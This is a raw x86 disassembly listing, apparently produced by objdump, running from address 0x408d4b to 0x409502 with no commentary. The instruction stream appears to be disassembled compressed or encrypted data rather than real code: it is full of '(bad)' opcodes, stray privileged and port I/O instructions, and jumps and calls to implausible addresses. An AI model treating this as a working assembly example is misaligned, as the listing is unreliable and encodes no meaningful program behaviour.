  408d4b:	jns    0x408ce3
  408d4d:	das    
  408d4e:	and    DWORD PTR [ecx+0x5c67278b],esi
  408d54:	mov    ebp,0x16884536
  408d59:	dec    ecx
  408d5a:	loop   0x408d74
  408d5c:	inc    eax
  408d5d:	stos   DWORD PTR es:[edi],eax
  408d5e:	lods   eax,DWORD PTR ds:[esi]
  408d5f:	call   0x7986a15b
  408d64:	mov    edx,ecx
  408d66:	inc    esi
  408d67:	mov    ebx,DWORD PTR [ebx-0x13]
  408d6a:	cmp    DWORD PTR [ecx-0x12],ebx
  408d6d:	popf   
  408d6e:	cmp    eax,0xd1b9152b
  408d73:	pop    ebx
  408d74:	das    
  408d75:	sbb    esp,eax
  408d77:	mov    dh,0x61
  408d79:	repz mov ebp,eax
  408d7c:	ja     0x408dd2
  408d7e:	cs js  0x408d28
  408d81:	stos   BYTE PTR es:[edi],al
  408d82:	loope  0x408d4c
  408d84:	fidiv  WORD PTR [eax+edx*1]
  408d87:	int    0x6b
  408d89:	les    edi,FWORD PTR [esi-0x80]
  408d8c:	push   ebp
  408d8d:	sti    
  408d8e:	mov    ds:0xab3e42e3,al
  408d93:	xor    DWORD PTR [esi-0x63],edi
  408d96:	inc    ecx
  408d97:	mov    al,0x78
  408d99:	adc    eax,eax
  408d9b:	sbb    BYTE PTR [edx+0x171ba42],cl
  408da1:	xor    ecx,ebx
  408da3:	ins    BYTE PTR es:[edi],dx
  408da4:	data16 fdivr QWORD PTR [eax-0x59ada380]
  408dab:	or     esi,DWORD PTR [ebx]
  408dad:	mov    al,ds:0xb005696
  408db2:	mov    ebx,0x8ba6857a
  408db7:	dec    eax
  408db8:	mov    DWORD PTR [edx-0x53],esp
  408dbb:	mov    ebx,0xbb12e375
  408dc0:	aaa    
  408dc1:	pop    esi
  408dc2:	loope  0x408d98
  408dc4:	mov    DWORD PTR [ebp+0x6d8cb7aa],ecx
  408dca:	cld    
  408dcb:	(bad)
  408dce:	dec    ebp
  408dcf:	sbb    DWORD PTR [eax-0x6e],0xeddba124
  408dd6:	xor    cl,bh
  408dd8:	xor    bl,BYTE PTR [esi-0x1ba40987]
  408dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ddf:	ret    
  408de0:	mov    ds:0xdb1f79ef,eax
  408de5:	cmp    esp,DWORD PTR [edi+0x48460fe9]
  408deb:	cdq    
  408dec:	aam    0x66
  408dee:	pop    ds
  408def:	add    ch,BYTE PTR [edx+0x69]
  408df2:	retf   
  408df3:	icebp  
  408df4:	jmp    0x2255ce93
  408df9:	sbb    DWORD PTR [esi-0x61cffc7b],edx
  408dff:	or     ah,0xcd
  408e02:	popf   
  408e03:	push   eax
  408e04:	mov    al,ds:0x5853be24
  408e09:	mov    ah,0xb5
  408e0b:	out    0x54,al
  408e0d:	jecxz  0x408e0a
  408e0f:	sti    
  408e10:	sti    
  408e11:	adc    al,0x45
  408e13:	push   ecx
  408e14:	pop    ds
  408e15:	(bad)  
  408e16:	in     al,0x9c
  408e18:	jg     0x408e11
  408e1a:	xor    eax,0x9cfe100b
  408e1f:	add    al,BYTE PTR [eax-0x6a]
  408e22:	int    0x1f
  408e24:	add    bh,BYTE PTR [esi]
  408e26:	gs loope 0x408e58
  408e29:	pop    ebx
  408e2a:	imul   edi,esi,0xffffff86
  408e2d:	mov    ch,0x76
  408e2f:	xor    ebp,DWORD PTR [eax]
  408e31:	jl     0x408e28
  408e33:	xor    DWORD PTR [esi-0x6abffe86],esp
  408e39:	xchg   edi,eax
  408e3a:	sbb    eax,0xae318018
  408e3f:	aaa    
  408e40:	sub    ebx,esi
  408e42:	and    BYTE PTR [ecx+ebp*4],0xdb
  408e46:	ror    BYTE PTR [edx+0x29],1
  408e49:	div    dh
  408e4b:	outs   dx,BYTE PTR ds:[esi]
  408e4c:	jo     0x408e7e
  408e4e:	push   ss
  408e4f:	pop    eax
  408e50:	fwait
  408e51:	cli    
  408e52:	jl     0x408ec3
  408e54:	dec    ecx
  408e55:	xchg   edx,eax
  408e56:	dec    eax
  408e57:	fisubr DWORD PTR [ecx+0x61c30263]
  408e5d:	dec    edx
  408e5e:	stos   DWORD PTR es:[edi],eax
  408e5f:	xchg   ebp,eax
  408e60:	and    BYTE PTR [ebp-0x610768ba],dl
  408e66:	aas    
  408e67:	push   0x97bb2c39
  408e6c:	bound  ebp,QWORD PTR [edi]
  408e6e:	ds aam 0xf3
  408e71:	icebp  
  408e72:	test   eax,0x812ed2b
  408e77:	fcom   DWORD PTR ds:0xbbee69e7
  408e7d:	shl    DWORD PTR [ecx+0x4d],cl
  408e80:	mov    al,ds:0xcb51e709
  408e85:	out    0xb4,eax
  408e87:	push   es
  408e88:	arpl   WORD PTR [esi+eax*8],sp
  408e8b:	mov    eax,0x672ca004
  408e90:	cmp    DWORD PTR ds:0xab019bd8,esp
  408e96:	xchg   esi,eax
  408e97:	dec    eax
  408e98:	pop    esp
  408e99:	xchg   ebp,eax
  408e9a:	cli    
  408e9b:	pop    ebx
  408e9c:	sti    
  408e9d:	sbb    ebp,ebp
  408e9f:	fistp  QWORD PTR [ebx-0x50747c83]
  408ea5:	jg     0x408e32
  408ea7:	xor    esp,DWORD PTR [edi]
  408ea9:	fimul  DWORD PTR [eax]
  408eab:	inc    ecx
  408eac:	adc    eax,0xe7bd8bee
  408eb1:	dec    ebp
  408eb2:	addr16 pop edi
  408eb4:	cmp    al,0xb3
  408eb6:	dec    esi
  408eb7:	ins    BYTE PTR es:[edi],dx
  408eb8:	push   edi
  408eb9:	sub    esp,DWORD PTR [ebp-0x1b850a18]
  408ebf:	jns    0x408e82
  408ec1:	xlat   BYTE PTR ds:[ebx]
  408ec2:	push   esp
  408ec4:	jns    0x408f2c
  408ec6:	jns    0x408e92
  408ec8:	mov    ds:0xcec93f8f,eax
  408ecd:	test   eax,0x3c9f6cb3
  408ed2:	dec    ebp
  408ed3:	mov    ebx,0x7336c3d3
  408ed8:	jle    0x408f31
  408eda:	pop    ecx
  408edb:	dec    ecx
  408edc:	xor    al,0xb6
  408ede:	mov    cl,0xa8
  408ee0:	ds ja  0x408e90
  408ee3:	add    eax,0xf5032fed
  408ee8:	xlat   BYTE PTR ds:[ebx]
  408ee9:	push   eax
  408eea:	sbb    BYTE PTR [eax+0x3d54b4e4],dl
  408ef0:	retf   
  408ef1:	scas   eax,DWORD PTR es:[edi]
  408ef2:	cmp    DWORD PTR [eax],ecx
  408ef4:	dec    eax
  408ef5:	or     BYTE PTR [ecx-0x3437efcc],dh
  408efb:	add    DWORD PTR [eax+0x7d],esi
  408efe:	mov    ecx,0xfc99df46
  408f03:	fadd   DWORD PTR [ebx]
  408f05:	shr    BYTE PTR [esi+esi*1-0x13],0x3
  408f0a:	dec    edi
  408f0b:	add    BYTE PTR [edi-0x3bf3827e],cl
  408f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f12:	(bad)  
  408f13:	(bad)  
  408f14:	jg     0x408ee7
  408f16:	bound  esi,QWORD PTR [edi]
  408f18:	mov    edi,?
  408f1a:	(bad)  
  408f1b:	sbb    BYTE PTR [edi],bh
  408f1d:	push   0x35b7283b
  408f22:	push   ecx
  408f23:	iret   
  408f24:	iret   
  408f25:	add    dl,BYTE PTR [eax]
  408f27:	add    BYTE PTR [eax],cl
  408f29:	(bad)  
  408f2a:	enter  0x2184,0x99
  408f2e:	push   es
  408f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f30:	mov    esp,0x892bd023
  408f35:	push   edx
  408f36:	mov    bl,ch
  408f38:	mov    ebp,0x400f763d
  408f3d:	or     dl,BYTE PTR [ebp+0x31]
  408f40:	add    BYTE PTR [ecx+ecx*2-0x6e],0x44
  408f45:	shr    bl,1
  408f47:	mov    WORD PTR es:[esi+0x2906362d],es
  408f4e:	jecxz  0x408f13
  408f50:	cmp    BYTE PTR [ecx+0x725d836],0xdb
  408f57:	push   ecx
  408f58:	leave  
  408f59:	add    cl,BYTE PTR ds:0xf6bcac05
  408f5f:	inc    edi
  408f60:	adc    DWORD PTR [ebx+ecx*8-0x6f],esp
  408f64:	lods   eax,DWORD PTR ds:[esi]
  408f65:	mov    ch,0x3a
  408f67:	ss push 0x74
  408f6a:	hlt    
  408f6b:	sub    eax,0x20000063
  408f70:	add    BYTE PTR [ecx+0x44],cl
  408f73:	inc    ecx
  408f74:	push   esp
  408f75:	popf   
  408f76:	dec    ebx
  408f77:	add    BYTE PTR [eax-0x3c3ba676],dh
  408f7d:	xchg   esp,eax
  408f7e:	sub    eax,0xeb976f75
  408f83:	mov    ecx,0x72c86d4a
  408f88:	shr    DWORD PTR [esi+ebp*1-0x68],0xcd
  408f8d:	sub    eax,0x9592ccb3
  408f92:	xchg   esi,eax
  408f93:	scas   al,BYTE PTR es:[edi]
  408f94:	jbe    0x408f27
  408f96:	add    dl,BYTE PTR [ebx]
  408f98:	mov    bl,0x80
  408f9a:	clc    
  408f9b:	xchg   esi,eax
  408f9c:	bound  ebp,QWORD PTR [edx+eax*8+0x5d]
  408fa0:	pop    edx
  408fa1:	mov    BYTE PTR [ebp-0x66247afe],al
  408fa7:	iret   
  408fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa9:	mov    esp,0x3837caf1
  408fae:	mov    ebp,0xa8a5209d
  408fb3:	sub    BYTE PTR [ecx-0x18],dh
  408fb6:	std    
  408fb7:	out    dx,eax
  408fb8:	lds    eax,FWORD PTR [edi]
  408fba:	adc    al,al
  408fbc:	and    BYTE PTR [eax],ch
  408fbe:	mov    edi,0xbf678631
  408fc3:	stc    
  408fc4:	add    bh,BYTE PTR [ebx-0x101c329d]
  408fca:	sti    
  408fcb:	add    bl,bl
  408fcd:	cmp    esp,DWORD PTR [edi+0x38]
  408fd0:	jno    0x408fc4
  408fd2:	sub    al,0xbd
  408fd4:	(bad)  
  408fd5:	rcl    BYTE PTR [edi+0x1625106d],1
  408fdb:	neg    DWORD PTR [edi-0xd]
  408fde:	or     eax,esi
  408fe0:	neg    DWORD PTR [esi]
  408fe2:	aas    
  408fe3:	sbb    edx,DWORD PTR [ecx+0x12]
  408fe6:	push   esp
  408fe7:	xchg   esp,eax
  408fe8:	sbb    BYTE PTR ds:0x28a90122,dl
  408fee:	jmp    0x10e66267
  408ff3:	pusha  
  408ff4:	push   ebx
  408ff5:	(bad)  [ebx+0x2f6258a2]
  408ffb:	inc    edx
  408ffc:	mov    BYTE PTR [edi+0x44befb80],dh
  409002:	fmul   DWORD PTR [edi+0x66cc0025]
  409008:	rcl    DWORD PTR [ebx-0x40],cl
  40900b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40900c:	sar    dh,0x9c
  40900f:	mov    ch,0xf6
  409011:	pop    ss
  409012:	mov    al,0xe6
  409014:	xor    DWORD PTR [ebx+0x6d],ebp
  409017:	retf   
  409018:	jp     0x408fbf
  40901a:	mov    dh,0xa6
  40901c:	dec    esi
  40901d:	mov    cl,0x82
  40901f:	jb     0x40907c
  409021:	ins    BYTE PTR es:[edi],dx
  409022:	aam    0xd3
  409024:	mov    ebx,0xed0c3f5e
  409029:	jb     0x408ffe
  40902b:	cmp    BYTE PTR [ebx-0x2e524adb],bh
  409031:	fs stc 
  409033:	pushf  
  409034:	fldcw  WORD PTR [esi+edi*4-0x18]
  409038:	jne    0x40902a
  40903a:	int3   
  40903b:	pop    eax
  40903c:	or     dl,dl
  40903e:	and    al,0xe1
  409040:	jmp    0x90ad:0xbadc9bd5
  409047:	dec    edx
  409048:	nop
  409049:	and    al,0x4e
  40904b:	icebp  
  40904c:	xchg   ebp,eax
  40904d:	(bad)  
  40904e:	ficom  WORD PTR [esi]
  409050:	adc    cl,0xa8
  409053:	(bad)
  409056:	mov    ebx,ebp
  409058:	mov    ebp,0x94b4a28c
  40905d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40905e:	mov    ebx,0xc7228583
  409063:	fisttp WORD PTR [edi-0x15e6258e]
  409069:	retf   0x1419
  40906c:	repnz or BYTE PTR [ebx],dh
  40906f:	inc    eax
  409070:	mov    al,0x38
  409072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409073:	jbe    0x409043
  409075:	adc    eax,0x7dd77e8a
  40907a:	(bad)  
  40907b:	cdq    
  40907c:	adc    al,0x95
  40907e:	repnz mov ebx,0xd4eae32
  409084:	pop    edx
  409085:	inc    ebx
  409086:	xchg   esi,eax
  409087:	dec    ebx
  409088:	es xor eax,ebx
  40908b:	loope  0x4090e1
  40908d:	xor    BYTE PTR [ebp+0xb8319fb],bl
  409093:	dec    ebx
  409094:	xchg   ecx,eax
  409095:	or     BYTE PTR [edi],dh
  409097:	add    ch,BYTE PTR [esi+0x16024981]
  40909d:	sub    esp,DWORD PTR [edi+0x45635845]
  4090a3:	mov    ebp,0xbce4595c
  4090a8:	cmc    
  4090a9:	cli    
  4090aa:	or     ebp,esp
  4090ac:	mov    WORD PTR [edi*4+0x28a2975e],gs
  4090b3:	push   esi
  4090b4:	xchg   ch,dh
  4090b6:	push   esi
  4090b7:	sub    BYTE PTR [ecx-0x33],cl
  4090ba:	xchg   esi,eax
  4090bb:	push   es
  4090bc:	addr16 pop edi
  4090be:	idiv   ebx
  4090c0:	jge    0x409056
  4090c2:	push   edx
  4090c3:	cmp    al,0xfb
  4090c5:	(bad)  
  4090c6:	out    0xb9,eax
  4090c8:	jb     0x40912d
  4090ca:	retf   0x8f63
  4090cd:	inc    DWORD PTR [ebx+ebx*8]
  4090d0:	cmp    esp,DWORD PTR [edi-0x718ac627]
  4090d6:	outs   dx,BYTE PTR ds:[esi]
  4090d7:	outs   dx,DWORD PTR ds:[esi]
  4090d8:	mov    BYTE PTR [ebp-0x42e012fe],dh
  4090de:	jb     0x40913a
  4090e0:	push   edx
  4090e1:	test   DWORD PTR [ebx],0x78de82ac
  4090e7:	jnp    0x4090b5
  4090e9:	add    dl,al
  4090eb:	int3   
  4090ec:	inc    eax
  4090ed:	inc    esi
  4090ee:	das    
  4090ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090f0:	das    
  4090f1:	das    
  4090f2:	dec    ebx
  4090f3:	call   0x88acac1
  4090f8:	mov    ah,0xa9
  4090fa:	daa    
  4090fb:	std    
  4090fc:	les    ebp,FWORD PTR [esi+eiz*4+0x22acb2c]
  409103:	adc    BYTE PTR [edi],bh
  409105:	pop    ss
  409106:	lock fisubr DWORD PTR [edi-0x4]
  40910a:	(bad)  
  40910b:	outs   dx,DWORD PTR ds:[esi]
  40910c:	fdiv   QWORD PTR [edi+0x7e41c061]
  409112:	ins    BYTE PTR es:[edi],dx
  409113:	add    BYTE PTR [eax+0x3a],ah
  409116:	cmp    eax,0x34f8107c
  40911b:	mov    BYTE PTR [edi+0x75fcc6b1],bl
  409121:	imul   ecx,ebp,0xffffffd9
  409124:	mov    al,ds:0xf74504f0
  409129:	mov    dh,0x3d
  40912b:	xor    BYTE PTR ds:0x59bce9e,0xad
  409132:	(bad)  
  409133:	pop    eax
  409134:	mov    edi,fs
  409136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409137:	push   edx
  409138:	dec    edx
  409139:	push   esp
  40913a:	xchg   edx,eax
  40913b:	and    bh,BYTE PTR [edi+ebp*2-0x5e]
  40913f:	retf   
  409140:	xchg   edx,eax
  409141:	cmp    al,0x9b
  409143:	mov    ds:0x2c6302cb,eax
  409148:	pop    edx
  409149:	xchg   edi,eax
  40914a:	cwde   
  40914b:	loopne 0x4090da
  40914d:	or     eax,0xa7e0b82b
  409152:	loopne 0x409184
  409154:	xchg   BYTE PTR [ebx],bl
  409156:	aaa    
  409157:	outs   dx,BYTE PTR ds:[esi]
  409158:	xchg   ebx,eax
  409159:	xchg   edi,eax
  40915a:	cmp    eax,0xa516a54
  40915f:	lahf   
  409160:	push   es
  409161:	in     al,dx
  409162:	pop    edx
  409163:	nop
  409164:	xchg   edx,eax
  409165:	shr    BYTE PTR [ebp+0x2b],1
  409168:	ss push es
  40916a:	sub    DWORD PTR [ebp-0x598b3db2],ebx
  409170:	sub    DWORD PTR [edi-0x59497e64],edx
  409176:	pop    eax
  409177:	dec    esi
  409178:	add    BYTE PTR [edi],0xde
  40917b:	(bad)  
  40917c:	adc    al,0xa2
  40917e:	cmp    ch,BYTE PTR [esi]
  409180:	out    dx,al
  409181:	xchg   edx,eax
  409182:	push   esi
  409183:	cmc    
  409184:	fcom   st(5)
  409186:	ss mov edi,0x8abafda
  40918c:	mov    ds,WORD PTR [esi+0x32]
  40918f:	lods   al,BYTE PTR ds:[esi]
  409190:	loope  0x4091ae
  409192:	pop    esp
  409193:	bound  ebx,QWORD PTR [ebx]
  409195:	xchg   ecx,eax
  409196:	jns    0x409198
  409198:	aad    0x71
  40919a:	(bad)  
  40919b:	fsubr  DWORD PTR [edx-0x3]
  40919e:	mov    edi,0x80d9773c
  4091a3:	pop    ecx
  4091a4:	push   es
  4091a5:	jns    0x409215
  4091a7:	sub    DWORD PTR [ebx+0x51],ecx
  4091aa:	dec    ebp
  4091ab:	ret    
  4091ac:	lea    ebx,[eax+0x26]
  4091af:	cmp    dh,BYTE PTR [ebp+0xd69b45e]
  4091b5:	add    DWORD PTR [esi+0x6b],eax
  4091b8:	cs pop ebp
  4091ba:	js     0x4091d5
  4091bc:	cmp    eax,0x43cec2bf
  4091c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091c2:	cdq    
  4091c3:	iret   
  4091c4:	out    0x95,eax
  4091c6:	add    BYTE PTR [eiz*4-0x66436a78],0xf0
  4091ce:	ror    DWORD PTR [ebx+esi*4-0x13],cl
  4091d2:	cmc    
  4091d3:	jp     0x409249
  4091d5:	cmp    bl,BYTE PTR ds:0x979dfdbe
  4091db:	js     0x4091d2
  4091dd:	int    0x1b
  4091df:	cmp    al,0xf8
  4091e1:	call   0x402dcded
  4091e6:	inc    ebx
  4091e7:	scas   eax,DWORD PTR es:[edi]
  4091e8:	aas    
  4091e9:	add    al,0x21
  4091eb:	imul   esp,DWORD PTR [ecx+0x552f88c8],0x55
  4091f2:	sbb    eax,0xecb20e4f
  4091f7:	cwde   
  4091f8:	pop    edi
  4091f9:	push   esp
  4091fa:	sbb    eax,0x9868d5d6
  4091ff:	cmp    edx,DWORD PTR [eax-0x25]
  409202:	js     0x409266
  409204:	push   ecx
  409205:	mov    edx,DWORD PTR [edx]
  409207:	cmp    DWORD PTR [edx+0x2b],ebx
  40920a:	lods   al,BYTE PTR ds:[esi]
  40920b:	pop    ecx
  40920c:	int    0x0
  40920e:	inc    edx
  40920f:	add    al,0x20
  409211:	sahf   
  409212:	or     ch,BYTE PTR [edx+edi*2]
  409215:	sahf   
  409216:	sti    
  409217:	push   ds
  409218:	add    DWORD PTR [eax-0x67ff9ee1],eax
  40921e:	dec    esp
  40921f:	(bad)  
  409220:	ins    DWORD PTR es:[edi],dx
  409221:	loopne 0x40924f
  409223:	lock imul esp,eax,0x7f31ac17
  40922a:	int    0xc2
  40922c:	mov    al,0x8a
  40922e:	mov    eax,ds:0xcabb0e46
  409233:	add    edi,0x5457da82
  409239:	aas    
  40923a:	push   0x5d
  40923c:	push   edx
  40923d:	dec    ecx
  40923e:	xchg   esp,eax
  40923f:	push   0x84e135b9
  409244:	inc    eax
  409245:	jmp    0x4091d9
  409247:	xor    cl,bl
  409249:	sar    BYTE PTR [edx+0x5ee31b40],1
  40924f:	or     al,0x6e
  409251:	pusha  
  409252:	dec    ecx
  409253:	xchg   esi,eax
  409254:	xchg   edi,eax
  409255:	pop    eax
  409256:	xchg   esi,eax
  409257:	out    0x1,eax
  409259:	inc    esp
  40925a:	or     BYTE PTR [ecx+edx*8-0x748d41a4],cl
  409261:	shl    dh,cl
  409263:	dec    ecx
  409264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409265:	dec    ebx
  409266:	add    ecx,DWORD PTR [esi-0x6c]
  409269:	inc    esp
  40926a:	jns    0x4092a9
  40926c:	xchg   ebx,eax
  40926d:	inc    edx
  40926e:	nop
  40926f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409270:	xchg   edx,eax
  409271:	shl    DWORD PTR [eax],0x65
  409274:	arpl   WORD PTR [ebx],sp
  409276:	loope  0x4092e8
  409278:	push   edx
  409279:	nop
  40927a:	pop    ss
  40927b:	sbb    dh,BYTE PTR [ebx-0x2fa8152c]
  409281:	imul   dl
  409283:	imul   eax,DWORD PTR [ebx+0x71],0xffffff9b
  409287:	(bad)  
  409288:	pop    edx
  409289:	xchg   esi,eax
  40928a:	pop    ecx
  40928b:	inc    eax
  40928c:	dec    ebp
  40928d:	add    dl,al
  40928f:	rcl    BYTE PTR [edx+0x4f],0x5f
  409293:	adc    eax,0xe1a84189
  409298:	cmp    ecx,DWORD PTR [eax]
  40929a:	pusha  
  40929b:	and    eax,edx
  40929d:	mov    ebp,0x6b009cb8
  4092a2:	add    eax,0xb59eb842
  4092a7:	sub    al,0xd
  4092a9:	jns    0x4092cc
  4092ab:	push   0x29
  4092ad:	shl    DWORD PTR [ecx+0x45],0x9e
  4092b1:	xor    BYTE PTR [ecx],ch
  4092b3:	inc    esi
  4092b4:	inc    ebp
  4092b5:	dec    eax
  4092b6:	jmp    0x9c2a:0x2db76b5f
  4092bd:	mov    cl,0xdc
  4092bf:	mov    eax,0xbf331e76
  4092c4:	int3   
  4092c5:	cdq    
  4092c6:	push   ebx
  4092c7:	fwait
  4092c8:	mov    ch,0x85
  4092ca:	xor    DWORD PTR [edx-0x1b],esp
  4092cd:	mov    cs,WORD PTR [ebp-0x80]
  4092d0:	push   ebp
  4092d1:	and    al,ah
  4092d3:	push   ds
  4092d4:	int    0xba
  4092d6:	aad    0x7c
  4092d8:	cli    
  4092d9:	jge    0x409339
  4092db:	jge    0x4092ca
  4092dd:	or     eax,0xafdbecfe
  4092e2:	jo     0x4092c6
  4092e4:	int3   
  4092e5:	jnp    0x409320
  4092e7:	jno    0x4092d3
  4092e9:	sbb    al,0x5b
  4092eb:	(bad)  [edi+0x11360c18]
  4092f1:	pop    esi
  4092f2:	stc    
  4092f3:	sub    eax,0xba2ac6ee
  4092f8:	fild   QWORD PTR [eax+0x68fd1355]
  4092fe:	mov    esi,0xab2ab8b1
  409303:	or     BYTE PTR [eax],al
  409305:	adc    DWORD PTR [eax],ecx
  409307:	push   esp
  409308:	retf   
  409309:	mov    al,ds:0xa0b4d219
  40930e:	aad    0x6a
  409310:	cmp    edx,DWORD PTR [ebx+0x17f53a94]
  409316:	adc    eax,0x4ca9ab8
  40931b:	push   0x6efb9c30
  409320:	inc    ebx
  409322:	(bad)  
  409323:	adc    BYTE PTR [eax],al
  409325:	sbb    al,0x4e
  409327:	(bad)  
  409328:	and    eax,DWORD PTR [ecx]
  40932a:	lahf   
  40932b:	(bad)
  40932e:	mov    dh,0xf0
  409330:	test   al,0xb5
  409332:	test   BYTE PTR [ebx],0xd6
  409335:	fadd   st,st(7)
  409337:	lods   al,BYTE PTR ds:[esi]
  409338:	mov    ch,0xbd
  40933a:	rcl    BYTE PTR [ebx-0x564297d1],1
  409340:	sub    DWORD PTR [esi-0x1b],edi
  409343:	lds    ebp,FWORD PTR [edi-0xa931e36]
  409349:	and    al,0x41
  40934b:	or     BYTE PTR ds:0xf1ac60d6,al
  409351:	icebp  
  409352:	aad    0x12
  409354:	imul   esi,DWORD PTR [edx+ebx*8],0x18
  409358:	out    0x8c,eax
  40935a:	xor    DWORD PTR [esi],eax
  40935c:	ins    DWORD PTR es:[edi],dx
  40935d:	sub    al,0x79
  40935f:	push   ecx
  409360:	inc    esi
  409361:	mov    ds:0x789e5cb3,eax
  409366:	ss fwait
  409368:	xlat   BYTE PTR ds:[ebx]
  409369:	xlat   BYTE PTR ds:[ebx]
  40936a:	outs   dx,DWORD PTR ds:[esi]
  40936b:	ret    
  40936c:	xor    eax,0xce4bad38
  409371:	mov    edi,0xfd68bb5
  409376:	mov    ds:0x20a92414,al
  40937b:	dec    ebp
  40937c:	add    al,0x52
  40937e:	push   es
  40937f:	push   0xa
  409381:	imul   ebp,DWORD PTR [edx],0x6c5b0e19
  409387:	(bad)  
  409388:	ficomp DWORD PTR [esp+ecx*4]
  40938b:	or     esp,esi
  40938d:	jae    0x4093d2
  40938f:	pop    esi
  409390:	fadd   DWORD PTR [esi]
  409392:	das    
  409393:	outs   dx,BYTE PTR ds:[esi]
  409394:	call   0xd141:0x5ba57801
  40939b:	imul   edx,DWORD PTR [esp+edi*2+0x55],0x33
  4093a0:	ins    BYTE PTR es:[edi],dx
  4093a1:	outs   dx,BYTE PTR ds:[esi]
  4093a2:	(bad)  
  4093a3:	aad    0x2d
  4093a5:	outs   dx,BYTE PTR ds:[esi]
  4093a6:	retf   0x92ab
  4093a9:	and    BYTE PTR [edx+0x6ebaae3],0xed
  4093b0:	or     eax,0xf27ac98e
  4093b5:	xchg   edx,eax
  4093b6:	cmc    
  4093b7:	add    eax,DWORD PTR [ebx+0x366599e6]
  4093bd:	jae    0x409390
  4093bf:	cmp    BYTE PTR [ecx+0x16],0xcc
  4093c3:	add    BYTE PTR [eax-0x5b],ch
  4093c6:	pop    esi
  4093c7:	inc    ecx
  4093c8:	arpl   WORD PTR [esi-0x6e2d1b24],bx
  4093ce:	lods   eax,DWORD PTR ds:[esi]
  4093cf:	lea    esi,[ebp-0x3d412114]
  4093d5:	in     eax,dx
  4093d6:	imul   ebx,edi,0xffffffe5
  4093d9:	icebp  
  4093da:	inc    edi
  4093db:	mov    dh,0xfd
  4093dd:	xchg   esp,eax
  4093de:	pop    esi
  4093df:	retf   
  4093e0:	imul   edi,DWORD PTR [esi-0x653985d5],0xd478205f
  4093ea:	shl    DWORD PTR [eiz*2-0x1e8de3c8],cl
  4093f1:	ret    0x9e45
  4093f4:	jns    0x4093ec
  4093f6:	inc    ebp
  4093f7:	xchg   BYTE PTR [ebx],bh
  4093f9:	(bad)  
  4093fb:	out    0x81,al
  4093fd:	(bad)  
  4093fe:	fcomp  st(4)
  409400:	cmp    cl,cl
  409402:	jo     0x4093b8
  409404:	add    eax,DWORD PTR [edx+0x55]
  409407:	sub    al,0x25
  409409:	fadd   QWORD PTR [eax+esi*1+0x1]
  40940d:	loop   0x4093ea
  40940f:	jne    0x409471
  409411:	push   edi
  409412:	scas   eax,DWORD PTR es:[edi]
  409413:	scas   al,BYTE PTR es:[edi]
  409414:	nop
  409415:	adc    al,0x14
  409417:	sti    
  409418:	aaa    
  409419:	add    cl,BYTE PTR [eax+0x4]
  40941c:	jmp    0x3f17:0xe85fad5f
  409423:	xor    eax,0xa6a3a0a6
  409428:	mov    ah,0x5a
  40942a:	cmp    edi,DWORD PTR [esi+0x3d]
  40942d:	test   ebp,esp
  40942f:	test   DWORD PTR [eax-0x7b],ecx
  409432:	adc    BYTE PTR [ecx+ebx*2+0x56],ah
  409436:	lea    ecx,[eax]
  409438:	ins    BYTE PTR es:[edi],dx
  409439:	enter  0xaade,0x8d
  40943d:	out    dx,eax
  40943e:	push   esp
  40943f:	jle    0x4093e9
  409441:	add    BYTE PTR [eax+0x38],dh
  409444:	fidivr WORD PTR [edi]
  409446:	pop    es
  409447:	cld    
  409448:	add    al,BYTE PTR [edx+0x3e63584f]
  40944e:	arpl   WORD PTR [ebp+edi*2+0x68e846dc],bp
  409455:	sbb    ebx,esi
  409457:	ror    BYTE PTR [edx-0xf],cl
  40945a:	add    ebx,esp
  40945c:	out    0x5f,eax
  40945e:	mov    dl,0xd6
  409460:	sub    eax,0x8102cfd
  409465:	sub    DWORD PTR [ecx+0x49],edx
  409468:	or     ebp,DWORD PTR [ecx+0x36810224]
  40946e:	call   0xf785:0x96519b22
  409475:	or     eax,0xd0bc142c
  40947a:	and    eax,0x6a525e45
  40947f:	pop    ebp
  409480:	or     eax,edi
  409482:	adc    BYTE PTR [ebx+0x64],0x6b
  409486:	sub    eax,0xccb4c6f3
  40948b:	push   ss
  40948c:	aaa    
  40948d:	or     BYTE PTR [eax+0x32],ch
  409490:	sbb    DWORD PTR [ebx-0xd],esi
  409493:	mov    cx,dx
  409496:	sub    DWORD PTR [edx+0x5a],edx
  409499:	adc    ah,BYTE PTR ds:0xa2d44a90
  40949f:	js     0x4094e3
  4094a1:	inc    edx
  4094a2:	mov    bh,0x23
  4094a4:	popf   
  4094a5:	xor    esi,DWORD PTR [eax+0x283e329f]
  4094ab:	leave  
  4094ac:	or     edi,DWORD PTR [ebp-0x4faaacc8]
  4094b2:	pop    ecx
  4094b3:	sub    esi,DWORD PTR [esi-0x6bd1220f]
  4094b9:	outs   dx,DWORD PTR ds:[esi]
  4094ba:	or     DWORD PTR [edx+ebx*1],edx
  4094bd:	mov    bl,BYTE PTR [eax+edi*2]
  4094c0:	test   al,0x68
  4094c2:	add    BYTE PTR [ecx+esi*1+0x667d135e],cl
  4094c9:	fist   WORD PTR [edx-0x37c9cdbd]
  4094cf:	gs aam 0x25
  4094d2:	or     esp,DWORD PTR [edi-0x4c]
  4094d5:	pop    es
  4094d6:	arpl   ax,bx
  4094d8:	xchg   DWORD PTR [ebx+eax*2],eax
  4094db:	dec    edi
  4094dc:	push   edi
  4094dd:	xchg   esi,eax
  4094de:	xchg   BYTE PTR [eax+edx*1+0xce733cc],ch
  4094e5:	pushf  
  4094e6:	xchg   BYTE PTR [si-0x31b0],ch
  4094eb:	out    0xd5,al
  4094ed:	(bad)  
  4094ee:	xor    BYTE PTR [ecx+0x17],dh
  4094f1:	mov    ds:0xf9c5bb82,al
  4094f6:	je     0x409497
  4094f8:	fwait
  4094f9:	push   edi
  4094fa:	mov    esi,0xb4eda9cb
  4094ff:	push   edx
  409500:	out    0xa6,al
  409502:	cmp    eax,0x6ff6cabf
